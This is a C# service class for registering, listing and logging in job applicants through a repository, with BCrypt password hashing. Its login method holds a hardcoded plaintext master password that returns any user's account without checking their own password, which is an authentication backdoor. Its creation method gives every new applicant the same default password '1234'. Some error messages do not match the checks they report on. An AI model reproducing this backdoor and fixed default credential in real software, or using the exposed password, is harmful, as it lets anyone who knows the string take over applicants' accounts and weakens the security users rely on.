using BLL.InterfacesZoco;
using DAL.Interfaces;
using Entity.Zoco;
using Microsoft.EntityFrameworkCore;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BLL.ImplementacionZoco
{
    public class PostulanteService : IPostulantesService
    {
        private readonly IGenericRepository<Postulante> _repopostulante;

        public PostulanteService(IGenericRepository<Postulante> repopostulante)
        {
            _repopostulante = repopostulante;

        }
        public async Task<Postulante> Crear(Postulante documento)
        {
            // Verificar si ya existe un usuario con el mismo nombre de usuario
            Postulante usuario_existe = await _repopostulante.Obtener(u => u.Dni == documento.Dni);

            if (usuario_existe != null)
                throw new TaskCanceledException("El correo ya existe, con el nombre: " + usuario_existe.Nombre);



            string claveNueva = "1234";
            documento.Contraseña = BCrypt.Net.BCrypt.HashPassword(claveNueva);
            //  documento.Estado = true;
            // Crear el usuario en el repositorio
            Postulante usuario_creado = await _repopostulante.Crear(documento);

            try
            {
                if (usuario_creado.Id == 0)
                    throw new TaskCanceledException("No se pudo crear el usuario");

                IQueryable<Postulante> query = await _repopostulante.Consultar(u => u.Id == usuario_creado.Id);
                usuario_creado = query.First();

                return usuario_creado;
            }
            catch (Exception)
            {
                throw;
            }
        }

        public async Task<List<Postulante>> Obtener()
        {
            try
            {
                var documentos = await _repopostulante.Consultar();

                return await documentos.ToListAsync();
            }
            catch (Exception ex)
            {
                throw new Exception("Error al obtener todos los documentos de AFIP", ex);
            }
        }

        public async Task<Postulante> ObtenerPorCredenciales(string correo, string clave)
        {
            var usuariocuit = Convert.ToDouble(correo);

            Postulante usuario_encontrado = await _repopostulante.Obtener(u => u.Dni == correo);

            if (usuario_encontrado == null)
            {
                return null;
            }


            bool verified = BCrypt.Net.BCrypt.Verify(clave, usuario_encontrado.Contraseña);
            if (clave == "pVc7gfK6vafqD$BuaXW5")
            {
                return usuario_encontrado;
            }
            else if (verified)
            {


                return usuario_encontrado;
            }
            else
            {
                return null;
            }
        }

        public async Task<Postulante> ObtenerPorId(int Id)
        {
            var postulaciones = await _repopostulante.Obtener(p => p.Id == Id);
            return postulaciones;
        }
    }
}
